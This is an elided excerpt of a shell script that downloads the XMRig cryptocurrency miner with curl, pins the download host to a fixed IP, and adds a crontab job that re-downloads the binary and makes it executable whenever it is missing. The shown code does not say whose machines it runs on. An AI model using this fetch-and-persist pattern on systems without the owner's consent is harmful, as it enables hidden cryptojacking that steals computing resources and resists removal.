...
download_xmrig() {
    ...
    curl -s --resolve "gh.llkk.cc:443:104.18.62.129" -L "$DOWNLOAD_URL" -o "$filepath"
...
setup_crontab() {
    ...
    local file_check_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s --resolve \"gh.llkk.cc:443:104.18.62.129\" -L \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
